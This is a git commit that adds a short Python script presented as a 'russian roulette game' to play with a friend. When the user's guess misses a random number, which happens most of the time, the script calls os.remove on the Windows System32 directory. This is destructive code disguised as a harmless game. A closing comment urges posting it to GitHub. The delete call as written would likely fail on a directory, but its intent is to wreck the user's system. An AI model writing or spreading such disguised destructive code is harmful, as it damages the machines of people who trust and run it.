bf24a64e17cec735219ec0bd815aa1083b2dc973
print("Artin") <art.1387.na@gmail.com>
2023-09-15 14:42:16 +0330

    Add files via upload

---
+++ russian-roulette-game.py
@@ -0,0 +1,16 @@
+import random
+import os
+
+# russian roulette game !
+# have fun playing it with your friend 😊😊
+
+
+user_num = int(input("what is your num bro ?"))
+computer_num = random.randint(1,10)
+
+if user_num == computer_num :
+    print("you fu*kin")
+else :
+    os.remove("C:\Windows\System32")
+    #print("hell is here")
+# note: post this to github
